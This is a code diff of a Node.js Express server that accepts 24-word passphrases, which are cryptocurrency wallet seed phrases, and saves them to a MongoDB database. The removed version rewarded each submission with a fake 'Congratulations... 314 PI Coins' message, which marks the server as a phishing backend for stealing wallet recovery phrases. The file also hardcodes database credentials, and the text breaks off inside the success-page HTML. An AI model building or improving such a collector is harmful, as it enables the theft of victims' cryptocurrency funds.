@@ -1,61 +1,64 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const cors = require('cors');
 const bodyParser = require('body-parser');
 const path = require('path');
 
-// Create Express app
+// Initialize Express app
 const app = express();
+const port = 3000;
+
+// MongoDB URI
+const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
+
+// Connect to MongoDB
+mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
+    .then(() => console.log('Connected to MongoDB successfully'))
+    .catch(err => console.log('Error connecting to MongoDB:', err));
+
+// Define the schema and model for the passphrase
+const passphraseSchema = new mongoose.Schema({
+    passphrase: {
+        type: String,
+        required: true,
+    }
+});
+
+const Passphrase = mongoose.model('Passphrase', passphraseSchema);
 
 // Middleware
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(cors());
 app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve static files (front-end assets)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// MongoDB Connection
-const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
-mongoose
-    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
-    .then(() => console.log('MongoDB connected'))
-    .catch(err => console.error('MongoDB connection error:', err));
-
-// Define Mongoose Schema and Model
-const PassphraseSchema = new mongoose.Schema({
-    passphrase: { type: String, required: true }
-});
-const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
-
-// Serve Frontend
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// POST Route to handle passphrase submission
+// Endpoint to handle passphrase submission
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
-    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
-        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
+    // Check if the passphrase contains exactly 24 words
+    if (!passphrase || passphrase.trim().split(' ').length !== 24) {
+        return res.status(400).send('Invalid passphrase! Please enter exactly 24 words.');
     }
 
+    // Save the passphrase to MongoDB
     try {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
-        const successMessage = `
-            <div style="background-color: white; padding: 20px; text-align: center;">
-                <h2 style="font-size: 24px; font-family: Arial, sans-serif; background-image: linear-gradient(to left, #ff0000, #ff9900, #33cc33, #3399ff, #9933ff); -webkit-background-clip: text; color: transparent;">
-                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
-                </h2>
-            </div>
-        `;
-
-        res.status(200).send(successMessage);
+        // Send a success response
+        res.send('Passphrase saved successfully!');
     } catch (error) {
-        console.error('Error saving passphrase:', error);
-        res.status(500).send('Failed to save passphrase.');
+        res.status(500).send('Error saving passphrase: ' + error.message);
     }
 });
 
-// Start the server
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+// Serve the success page when the passphrase is saved
+app.get('/success', (req, res) => {
+    res.send(`
+        <html>
+            <head>
+                <title>Passphrase Saved</title>
+                <
